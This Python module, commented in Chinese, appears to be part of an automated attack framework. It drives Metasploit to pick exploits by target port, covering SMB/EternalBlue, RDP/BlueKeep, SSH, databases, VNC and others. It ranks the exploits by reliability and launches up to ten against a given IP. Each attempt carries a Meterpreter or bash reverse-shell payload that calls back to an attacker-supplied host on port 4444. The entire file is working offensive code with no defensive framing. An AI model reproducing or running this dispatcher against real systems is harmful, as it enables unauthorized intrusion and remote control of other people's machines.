import os,sys
import re
import time
import threading
import fcntl
def safe_print(msg):
    with open(sys.stdout.fileno(), 'wb', closefd=False) as fd:
        fcntl.flock(fd, fcntl.LOCK_EX)  # 加锁
        sys.stdout.write(msg + '\n')
        sys.stdout.flush()
        fcntl.flock(fd, fcntl.LOCK_UN)  # 解锁

class Module:
    def __init__(self):
        self.name = "Dynamic MSF Exploit Dispatcher"
        self.port = None
        self.protocol = "tcp"
        self.platform = "multi"
        self.use_msf = True
        self.msf_client = None

    def exploit(self, target_ip=None, target_port=None, lhost=None): #,**kwargs):
        if target_port is None:
            return False, "需要指定目标端口"
        time.sleep(1)

        try:
            # 1. 获取 MSF 中所有 exploit 模块列表
            all_exploits = list(self.msf_client.modules.exploits.keys())
            # 2. 根据端口和服务类型筛选关键词
            keywords = self._get_keywords_for_port(target_port)
            matched = []
            for exp in all_exploits:
                if any(kw.lower() in exp.lower() for kw in keywords):
                    matched.append(exp)
            if not matched:
                return False, f"未找到匹配端口 {target_port} 的 MSF 模块"
            safe_print(f"[*] 找到 {len(matched)} 个候选模块，尝试执行...")
            # 3. 按成功率排序（优先 excellent/great 等级）
            matched = self._sort_by_rank(matched)
            # 4. 逐个尝试
            for exp_path in matched[:10]:  # 最多尝试前 10 个
                safe_print(f"[*] 尝试 MSF 模块: {exp_path}")
                try:
                    exploit = self.msf_client.modules.use("exploit", exp_path)
                    exploit["RHOSTS"] = target_ip
                    exploit["RPORT"] = target_port
                    # 自动选择合适 payload
                    payload = self._select_payload(exp_path, lhost)
                    if payload:
                        result = exploit.execute(payload=payload)
                        if result.get("job_id"):
                            return True, f"{exp_path} 执行成功"
                except:
                    continue
            return False, "所有候选模块均利用失败"
        except Exception as e:
            return False, str(e)

    def _get_keywords_for_port(self, port):
        """根据端口返回搜索关键词"""
        mapping = {
            21: ["ftp", "vsftpd", "proftpd"],
            22: ["ssh", "openssh", "libssh"],
            23: ["telnet"],
            25: ["smtp", "exim", "postfix"],
            80: ["http", "apache", "nginx", "iis", "tomcat", "php"],
            443: ["https", "ssl", "tls"],
            445: ["smb", "samba", "microsoft", "eternalblue"],
            1433: ["mssql", "sql server"],
            3306: ["mysql", "mariadb"],
            3389: ["rdp", "bluekeep", "cve_2019_0708"],
            5432: ["postgres", "postgresql"],
            6379: ["redis"],
            8080: ["http", "tomcat", "jenkins", "glassfish"],
            8443: ["https", "tomcat", "ssl"],
            27017: ["mongodb"],
            5900: ["vnc", "realvnc", "tightvnc", "ultravnc"],
            5901: ["vnc", "realvnc", "tightvnc", "ultravnc"],
            5902: ["vnc", "realvnc", "tightvnc", "ultravnc"],
        }
        return mapping.get(port, ["http", "tcp", "udp"])

    def _sort_by_rank(self, modules):
        """按 rank 排序，优先 excellent/great"""
        rank_order = {"excellent": 0, "great": 1, "good": 2, "normal": 3, "average": 4, "low": 5, "manual": 6}
        ranked = []
        for m in modules:
            info = self.msf_client.modules.exploits[m].info
            rank = info.get("rank", "normal")
            ranked.append((rank_order.get(rank, 10), m))
        ranked.sort(key=lambda x: x[0])
        return [m for _, m in ranked]

    def _select_payload(self, exp_path, lhost):
        """根据 exploit 平台自动选择 payload"""
        info = self.msf_client.modules.exploits[exp_path].info
        platform = info.get("platform", "")
        payload_map = {
            "windows": "windows/x64/meterpreter/reverse_tcp",
            "linux": "linux/x64/meterpreter/reverse_tcp",
            "unix": "cmd/unix/reverse_bash",
            "osx": "osx/x64/meterpreter/reverse_tcp",
            "php": "php/meterpreter/reverse_tcp",
            "python": "python/meterpreter/reverse_tcp",
            "java": "java/meterpreter/reverse_tcp",
        }
        for key, payload_path in payload_map.items():
            if key in platform.lower():
                p = self.msf_client.modules.use("payload", payload_path)
                p["LHOST"] = lhost
                p["LPORT"] = 4444
                return p
        return None
